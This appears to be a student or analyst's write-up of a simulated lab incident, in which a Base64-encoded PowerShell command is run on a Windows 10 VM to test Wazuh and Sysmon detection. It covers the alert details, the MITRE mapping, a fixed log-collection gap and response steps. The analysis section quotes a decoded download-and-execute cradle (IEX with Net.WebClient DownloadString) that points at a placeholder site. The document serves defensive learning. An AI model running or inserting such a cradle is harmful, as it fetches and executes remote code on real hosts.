# Incident Report 2: Encoded PowerShell Download Attempt (Simulated)

**Date:** 2 Oct 2026 | **Analyst:** Kaviya | **Status:** Closed (lab simulation)
**Severity:** Wazuh level 4 (low). If real, I would treat it as medium-high.

## 1. Summary
A Base64-encoded PowerShell command was run on the Windows 10 endpoint. It was designed to download content from a website and execute it. I ran it deliberately to test PowerShell detection. Wazuh raised rule 92027 twice.

## 2. Affected asset
- Host: SOC-Windows10 (192.168.56.101), agent SOC-Windows10-Agent
- User: kaviya-analyst, process integrity level Medium (not elevated)

## 3. Detection
- Source: Sysmon Event ID 1 (process creation) via the Wazuh agent
- Rule 92027, level 4: "Powershell process spawned powershell instance" (rule groups: sysmon, sysmon_eid1_detections, windows)
- MITRE ATT&CK: T1059.001 (Command and Scripting Interpreter: PowerShell), tactic Execution
- Command line: powershell.exe -enc <long Base64 string>
- Parent process: powershell.exe

## 4. Timeline (Wazuh shows local time; UTC in brackets)
- 13:35:45 first alert (rule 92027)
- 13:52:35 second alert (08:22:35 UTC)

## 5. Analysis
- The -enc flag hides what a script does by encoding it in Base64. Attackers use this to avoid simple keyword detection.
- The encoded string decodes to `IEX (New-Object Net.WebClient).DownloadString('http://example.com')`, which downloads a web page and runs it. This "download and execute" pattern is common in real attacks.
- A PowerShell process starting another PowerShell is also a typical sign of scripted or malicious activity.
- Verdict: True positive (simulated), expected behaviour in this lab.

## 6. Detection gap found and fixed
- My first test was not visible in Wazuh because the agent was not collecting the Sysmon log.
- Fix: I backed up ossec.conf, added the Sysmon log source to the agent configuration, and restarted the agent. Sysmon events then arrived and the PowerShell alerts appeared.
- Remaining gap: Wazuh rated this only level 4. A custom rule could raise the severity of encoded PowerShell commands.

## 7. Recommended response (if this were real)
1. Isolate the host and review the full command line.
2. Decode the Base64 string to see exactly what it does.
3. Check which website was contacted and block it.
4. Look for other commands run by the same user around that time.

## 8. Evidence
screenshots/powershell-detection-search.png, powershell-alert-commandline.png, powershell-alert-rule-mitre.png, sysmon-logs-arriving.png
